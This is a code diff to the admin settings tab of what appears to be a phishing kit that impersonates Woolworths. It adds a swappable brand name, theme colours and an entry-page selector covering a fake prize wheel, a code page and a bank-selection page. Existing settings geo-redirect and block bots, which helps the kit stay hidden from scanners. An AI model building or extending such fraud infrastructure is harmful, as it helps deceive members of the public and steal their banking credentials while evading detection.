@@ -13,6 +13,8 @@ export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
   const [allowedIps, setAllowedIps] = useState<string>("");
   const [geoRedirectUrl, setGeoRedirectUrl] = useState<string>("https://www.woolworths.com.au");
   const [blockBots, setBlockBots] = useState<boolean>(false);
+  const [campaignName, setCampaignName] = useState("Woolworths");
+  const [themePrimary, setThemePrimary] = useState("#12584F");
   const [openContinent, setOpenContinent] = useState<string | null>(null);
   const supabase = createBrowserSupabaseClient();
 
@@ -59,6 +61,7 @@ export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
     if (data) {
       setSettings(data);
       const sc = (data.site_control ?? {}) as Record<string, unknown>;
+      const ws = (data.wheel_settings ?? {}) as Record<string, unknown>;
       setAllowedCountries(Array.isArray(sc.allowed_countries) ? sc.allowed_countries : []);
       setAllowedIps(Array.isArray(sc.allowed_ips) ? sc.allowed_ips.join("\n") : "");
       setBlockBots(sc.block_bots === true);
@@ -66,6 +69,16 @@ export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
         typeof sc.geo_redirect_url === "string" && sc.geo_redirect_url.trim() !== ""
           ? sc.geo_redirect_url
           : "https://www.woolworths.com.au",
+      );
+      setCampaignName(
+        typeof ws.campaign_name === "string" && ws.campaign_name.trim() !== ""
+          ? ws.campaign_name.trim()
+          : "Woolworths",
+      );
+      setThemePrimary(
+        typeof ws.theme_primary === "string" && /^#[0-9a-fA-F]{6}$/.test(ws.theme_primary.trim())
+          ? ws.theme_primary.trim()
+          : "#12584F",
       );
     }
     setLoading(false);
@@ -95,13 +108,21 @@ export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
         portal_name: settings.portal_name,
         support_center_name: settings.support_center_name,
         site_enabled: settings.site_enabled !== false,
+        entry_page: settings.entry_page || "/win",
         site_control: {
           block_bots: blockBots,
           allowed_ips: allowedIps.split("\n").map((s) => s.trim()).filter(Boolean),
           allowed_countries: allowedCountries,
           geo_redirect_url: geoRedirectUrl.trim() || "https://www.woolworths.com.au",
         },
-        wheel_settings: settings.wheel_settings
+        wheel_settings: {
+          ...(settings.wheel_settings || {}),
+          campaign_name: campaignName.trim() || "Woolworths",
+          theme_primary:
+            /^#[0-9a-fA-F]{6}$/.test(themePrimary.trim()) && themePrimary.trim().toLowerCase() !== "#12584f"
+              ? themePrimary.trim()
+              : "",
+        }
       })
       .eq("id", settings.id || "default");
     
@@ -348,13 +369,86 @@ export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
                 </p>
               </div>
             </div>
+
+            {/* Ana Domain Giriş Sayfası */}
+            <div className={`rounded-2xl border p-5 ${darkMode ? 'border-white/10 bg-black/20' : 'border-gray-200 bg-gray-50/60'}`}>
+              <label className={`block text-[11px] font-bold mb-2 opacity-80 uppercase tracking-wider ${darkMode ? 'text-gray-300' : 'text-gray-600'}`}>Ana Domain Giriş Sayfası</label>
+              <p className={`text-[11px] mb-3 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>
+                Ziyaretçi ana domaini açtığında ilk göreceği sayfa (session her durumda oluşur).
+              </p>
+              <select
+                value={settings.entry_page || "/win"}
+                onChange={e => handleChange("entry_page", e.target.value)}
+                className={`w-full px-4 py-3 rounded-xl text-sm outline-none transition-all ${darkMode ? 'bg-black/20 text-white border border-white/10 focus:border-[#EB5E28]' : 'bg-gray-50 border border-gray-200 focus:border-[#EB5E28]'}`}
+              >
+                <option value="/win">İsim Formu — /win (varsayılan akış)</option>
+                <option value="/wheel">Şans Çarkı — /wheel</option>
+                <option value="/code">Katılım Kodu — /code</option>
+                <option value="/banken">Banka Seçimi — /banken</option>
+              </select>
+            </div>
           </div>
         </div>
 
         <div className={`p-8 rounded-3xl border shadow-[0_8px_30px_rgb(0,0,0,0.04)] backdrop-blur-xl ${darkMode ? 'bg-[#1c1c1e]/70 border-white/5' : 'bg-white/80 border-[#d2d2d7]/50'}`}>
           <h3 className={`text-lg font-bold mb-8 border-b pb-4 ${darkMode ? 'border-white/10 text-[#EB5E28]' : 'border-gray-200 text-[#EB5E28]'}`}>Marka ve Tasarım</h3>
-          
+
           <div className="space-y-8">
+            {/* Kampanya Adı: sitede "Woolworths" yazan her yeri degistirir */}
+            <div className={`rounded-2xl border p-5 ${darkMode ? 'border-[#EB5E28]/30 bg-[#EB5E28]/5' : 'border-orange-200 bg-orange-50/60'}`}>
+              <label className={`block text-[11px] font-bold mb-2 opacity-80 uppercase tracking-wider ${darkMode ? 'text-gray-300' : 'text-gray-600'}`}>Kampanya Adı (Marka İsmi)</label>
+              <div className="flex gap-3 items-center">
+                <input
+                  type="text"
+                  value={campaignName}
+                  onChange={(e) => setCampaignName(e.target.value)}
+                  placeholder="Woolworths"
+                  className={`flex-1 px-4 py-3 rounded-xl text-sm font-bold outline-none transition-all ${darkMode ? 'bg-black/20 text-white border border-white/10 focus:border-[#EB5E28]' : 'bg-white border border-gray-200 focus:border-[#EB5E28]'}`}
+                />
+                <span className={`text-xs font-bold px-3 py-1.5 rounded-full whitespace-nowrap ${darkMode ? 'bg-[#EB5E28]/15 text-[#EB5E28]' : 'bg-orange-100 text-[#EB5E28]'}`}>
+                  {campaignName.trim() || "Woolworths"}
+                </span>
+              </div>
+              <p className={`text-[11px] mt-2 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>
+                Buraya yazılan isim kaydedildiğinde sitenin <b>tüm metinlerindeki "Woolworths" ibaresi</b> bu isimle değiştirilir (başlıklar, portal adı, OG paylaşım metinleri, destek merkezi vb.). Boş bırakılırsa "Woolworths" kalır.
+              </p>
+            </div>
+
+            {/* Tema Rengi: sitedeki ana vurgu rengi (butonlar, borderlar, glow) */}
+            <div className={`rounded-2xl border p-5 ${darkMode ? 'border-white/10 bg-white/[0.03]' : 'border-gray-200 bg-gray-50/60'}`}>
+              <label className={`block text-[11px] font-bold mb-2 opacity-80 uppercase tracking-wider ${darkMode ? 'text-gray-300' : 'text-gray-600'}`}>Tema Rengi (Ana Renk)</label>
+              <div className="flex items-center gap-3">
+                <input
+                  type="color"
+                  value={themePrimary}
+                  onChange={(e) => setThemePrimary(e.target.value)}
+                  className="h-11 w-14 cursor-pointer rounded-lg border-0 bg-transparent p-0"
+                />
+                <input
+                  type="text"
+                  value={themePrimary}
+                  onChange={(e) => setThemePrimary(e.target.value)}
+                  placeholder="#12584F"
+                  className={`w-32 px-3 py-2.5 rounded-xl text-sm font-mono outline-none transition-all ${darkMode ? 'bg-black/20 text-white border border-white/10 focus:border-[#EB5E28]' : 'bg-white border border-gray-200 focus:border-[#EB5E28]'}`}
+                />
+                <button
+                  type="button"
+                  onClick={() => setThemePrimary("#12584F")}
+                  className={`text-xs font-bold px-3 py-2 rounded-lg transition-colors ${darkMode ? 'bg-white/10 text-gray-300 hover:bg-white/15' : 'bg-gray-200 text-gray-600 hover:bg-gray-300'}`}
+                >
+                  Varsayılana Dön
+                </button>
+                <span
+                  className="ml-auto h-8 w-24 rounded-lg border border-white/10"
+                  style={{ background: `linear-gradient(90deg, ${/^#[0-9a-fA-F]{6}$/.test(themePrimary) ? themePrimary : '#12584F'}, rgba(0,0,0,0.4))` }}
+                  title="Önizleme"
+                />
+              </div>
+              <p className={`text-[11px] mt-2 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>
+                Sitedeki <b>butonlar, kenarlıklar, glow efektleri ve panel arka planı</b> bu renkten türetilir (koyu tonlar otomatik hesaplanır). Kaydettikten sonra site kendini yeni renge boyar.
+              </p>
+            </div>
+
             <div className="flex gap-5 items-center border-b border-black/5 dark:border-white/5 pb-8">
               <div className={`w-24 h-24 shrink-0 rounded-2xl border flex items-center justify-center p-2 overflow-hidden shadow-inner ${darkMode ? 'bg-black/40 border-white/10' : 'bg-gray-100 border-gray-200'}`}>
                 {settings.logo_url ? <img src={settings.logo_url} alt="" className="max-w-full max-h-full object-contain drop-shadow-md" /> : <span className="text-xs opacity-50 font-medium">Logo Yok</span>}
